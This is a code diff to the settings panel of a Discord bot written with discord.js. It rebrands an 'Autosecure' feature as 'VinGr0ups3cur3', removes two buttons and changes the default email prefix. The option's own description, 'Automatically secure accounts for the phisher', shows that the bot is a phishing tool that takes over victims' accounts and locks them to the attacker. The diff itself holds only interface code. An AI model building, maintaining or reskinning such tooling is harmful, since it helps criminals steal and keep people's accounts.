@@ -28,7 +28,7 @@ const featureMenu = new StringSelectMenuBuilder()
             .setMinValues(1)
 .addOptions([
     {
-        label: `${settings.auto_secure ? 'Stop' : 'Start'} Autosecure`,
+        label: `${settings.auto_secure ? 'Stop' : 'Start'} VinGr0ups3cur3`,
         description: 'Automatically secure accounts for the phisher',
         value: `settings|auto_secure|${settings.auto_secure ? '0' : '1'}`,
     },
@@ -137,10 +137,6 @@ const featureMenu = new StringSelectMenuBuilder()
         new ButtonBuilder()
             .setCustomId('changelanguage')
             .setLabel('Language')
-            .setStyle(ButtonStyle.Secondary),
-        new ButtonBuilder()
-            .setCustomId('changeprefix')
-            .setLabel('Prefix')
             .setStyle(ButtonStyle.Secondary)
     );
 
@@ -204,12 +200,7 @@ const featureMenu = new StringSelectMenuBuilder()
                 .setCustomId(`toggle_ping`)
                 .setLabel("Ping")
                 .setEmoji("🔔")
-                .setStyle(ButtonStyle.Primary),
-            new ButtonBuilder()
-                .setCustomId(`users`)
-                .setLabel("Users")
-                .setEmoji("👥")
-                .setStyle(ButtonStyle.Primary),   
+                .setStyle(ButtonStyle.Primary)
         );
 
         let currentState = 'nothing';
@@ -322,7 +313,7 @@ const featureMenu = new StringSelectMenuBuilder()
 
     const createEmbed = async (isFeaturePanel) => {
         const embed = new EmbedBuilder()
-            .setTitle(`${isFeaturePanel ? 'Autosecure Settings for ' + client.user.username : 'Admin Settings'}`)
+            .setTitle(`${isFeaturePanel ? 'VinGr0ups3cur3 Settings for ' + client.user.username : 'Admin Settings'}`)
             .setColor(0xb2c7e0)
 
         if (isFeaturePanel) {
@@ -334,7 +325,7 @@ const featureMenu = new StringSelectMenuBuilder()
 
             embed.addFields(
                 {
-                    name: "Autosecure",
+                    name: "VinGr0ups3cur3",
                     value: `${settings.auto_secure ? "✅" : "❌"}`,
                     inline: true
                 },
@@ -517,7 +508,7 @@ const featureMenu = new StringSelectMenuBuilder()
                 },
                 {
                     name: "Email Prefix",
-                    value: settings.prefix ? settings.prefix : "hachiiromc",
+                    value: config.prefix || "vinGr0up",
                     inline: true
                 }
             );
